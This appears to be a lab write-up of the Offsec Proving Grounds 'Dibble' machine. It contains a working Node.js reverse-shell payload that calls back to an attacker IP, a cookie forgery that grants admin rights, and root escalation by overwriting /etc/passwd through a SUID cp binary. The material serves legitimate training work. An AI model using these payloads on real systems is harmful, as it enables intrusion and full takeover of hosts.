---
title: "Proving grounds Practice: Dibble"
layout: post
date: 2024-02-08 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- NodeJS
- SUID
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
3000/tcp  open  http    Node.js (Express middleware)
27017/tcp open  mongodb MongoDB 4.2.9
```

## 21/tcp    open  ftp     vsftpd 3.0.3
- [x] anonymous login 

## 80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))

File and Directory discovery
- http://192.168.213.110/
- http://192.168.213.110/web.config

## 3000/tcp  open  http    Node.js (Express middleware)

- Register a user.
- Change cookie from default to admin.
- Base64 encode the value and then url encode it.`userLevel=YWRtaW4%3D`
- Refresh the page.
- Add new event log.

#### node js reverse shell

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.45.232", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

## Initial Foothold

```sh
naveenj@hackerspace:[09:37]~/proving_grounds/Dibble$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.232] from (UNKNOWN) [192.168.201.110] 37530
id
uid=1000(benjamin) gid=1000(benjamin) groups=1000(benjamin)
ls -al
```

## Privilege Escalation

### Exfiltrated Information

```sh
 *   'database' => 'databasename',
 *   'username' => 'sqlusername',
 *   'password' => 'sqlpassword',
 *   'host' => 'localhost',
 *   'port' => '3306',
 *   'driver' => 'mysql',
```

## SUID

```sh
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
```

### SUID Exploitation

- Read /etc/passwd and paste the contents in a file in the local machine.
- Add new sudo user entry to the file.
- Download the updated file to the attacking machine.
- Use `cp` to copy the updated file content to `/etc/passwd`.
- Switch to the new user which we created using the password.

```sh
[benjamin@dibble tmp]$ cp passwd /etc/passwd
cp passwd /etc/passwd
[benjamin@dibble tmp]$ su hacker
su hacker
Password: mypass

[root@dibble tmp]# cd /root
```

**Root Obtained**

### Reference

- https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).